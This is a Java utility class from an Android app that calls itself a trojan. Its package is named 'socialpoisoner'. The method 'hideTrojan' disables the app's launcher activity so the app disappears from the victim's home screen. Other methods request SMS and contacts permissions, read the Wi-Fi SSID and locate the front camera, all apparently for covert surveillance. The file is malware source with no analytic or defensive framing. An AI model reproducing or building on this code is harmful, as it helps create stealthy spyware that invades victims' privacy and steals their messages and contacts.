package com.cakeman.doctorrabb.socialpoisoner.modules;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.support.v4.app.ActivityCompat;

import java.io.File;

/**
 * Created by doctorrabb on 15.07.16.
 */
public class Util {

    public static String getCurrentSSID (Context context) {
        ConnectivityManager connManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        if (networkInfo.isConnected()) {
            final WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            final WifiInfo connectionInfo = wifiManager.getConnectionInfo();
            return connectionInfo.getSSID();
        }

        return null;
    }

    public static void requestWithout (Activity context) {
        ActivityCompat.requestPermissions(context, constants.marshmallowPermissions, 1);
    }

    public static void requestAllPermissions (Activity context) {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_DENIED
            || ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_DENIED) {
                requestWithout (context);
        }
    }

    public static void hideTrojan (Context context) {
        String pgkname = context.getPackageName();
        ComponentName componentToDisable = new ComponentName(pgkname,pgkname+".MainActivity");
        context.getPackageManager().setComponentEnabledSetting(
                componentToDisable,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }

    public static int getFrontCamera () {
        int cameraId = -1;
        int numberOfCameras = Camera.getNumberOfCameras();
        for (int i = 0; i < numberOfCameras; i++) {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(i, info);
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {

                cameraId = i;
                break;
            }
        }
        return cameraId;
    }
}
